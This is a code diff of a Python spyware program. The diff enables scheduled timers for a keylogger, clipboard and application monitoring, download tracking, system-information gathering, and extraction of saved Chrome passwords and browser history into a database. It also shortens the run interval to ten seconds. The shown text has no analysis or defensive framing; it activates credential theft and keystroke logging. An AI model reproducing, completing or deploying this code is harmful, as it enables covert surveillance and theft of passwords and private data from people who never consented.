@@ -342,6 +342,7 @@ def extract_and_insert_chrome_passwords():
             date_last_used = row[5]
 
             if username or password:
+                time.sleep(1)
                 insert_chrome_password_data(origin_url, action_url, username, password,
                                             get_chrome_datetime(date_created), get_chrome_datetime(date_last_used))
             else:
@@ -418,6 +419,7 @@ def get_browser_history_file_location():
 # Function to insert browser history data into the browser_history table
 def insert_browser_history_data(url, title, last_visit_time):
     try:
+        time.sleep(1)
         query = "INSERT INTO browser_history (url, title, last_visit_time) " \
                 "VALUES (%s, %s, %s)"
         values = (url, title, last_visit_time)
@@ -440,6 +442,7 @@ def extract_and_insert_browser_history():
 
             if extracted_data:
                 for entry in extracted_data:
+
                     url, title, last_visit_time = entry
                     insert_browser_history_data(url, title, last_visit_time)
 
@@ -452,38 +455,41 @@ def extract_and_insert_browser_history():
 
 
 # Set the time interval for keylogger data insertion (in seconds)
-interval = 60.0
+interval = 10.0
 
-# #Feature : 1
-# # Schedule the keylogger to run at the specified interval
-# keylogger_timer = Timer(interval, start_keylogger)
-# keylogger_timer.start()
-# #Feature : 2
-# # Start clipboard monitoring
-# clipboard_thread = Timer(interval, monitor_clipboard)
-# clipboard_thread.start()
-# #Feature : 3
-# # Start application monitoring
-# applications_thread = Timer(interval, monitor_applications)
-# applications_thread.start()
-# #Feature : 4
-# # Schedule the download data insertion to run at the specified interval
-# downloads_timer = Timer(interval, get_last_10_downloads)
-# downloads_timer.start()
-#
-# #Feature : 5
-# # Gather system information at the beginning
-# gather_system_info()
-# # Schedule the system info gathering to run at a longer interval
-# system_info_timer = Timer(3600.0, gather_system_info)
-# system_info_timer.start()
-#
-# #Feature : 6
-# # Schedule the chrome passwords extraction and insertion to run at the specified interval
-# chrome_passwords_timer = Timer(interval, extract_and_insert_chrome_passwords)
-# chrome_passwords_timer.start()
+
+
+#Feature : 1
+# Schedule the keylogger to run at the specified interval
+keylogger_timer = Timer(interval, start_keylogger)
+keylogger_timer.start()
+#Feature : 2
+# Start clipboard monitoring
+clipboard_thread = Timer(interval, monitor_clipboard)
+clipboard_thread.start()
+#Feature : 3
+# Start application monitoring
+applications_thread = Timer(interval, monitor_applications)
+applications_thread.start()
+#Feature : 4
+# Schedule the download data insertion to run at the specified interval
+downloads_timer = Timer(interval, get_last_10_downloads)
+downloads_timer.start()
+
+#Feature : 5
+# Gather system information at the beginning
+gather_system_info()
+# Schedule the system info gathering to run at a longer interval
+system_info_timer = Timer(interval, gather_system_info)
+system_info_timer.start()
+
+#Feature : 6
+# Schedule the chrome passwords extraction and insertion to run at the specified interval
+chrome_passwords_timer = Timer(interval, extract_and_insert_chrome_passwords)
+chrome_passwords_timer.start()
 
 #Feature : 7
 # Schedule the browser history extraction and insertion to run at the specified interval
 browser_history_timer = Timer(interval, extract_and_insert_browser_history)
 browser_history_timer.start()
+
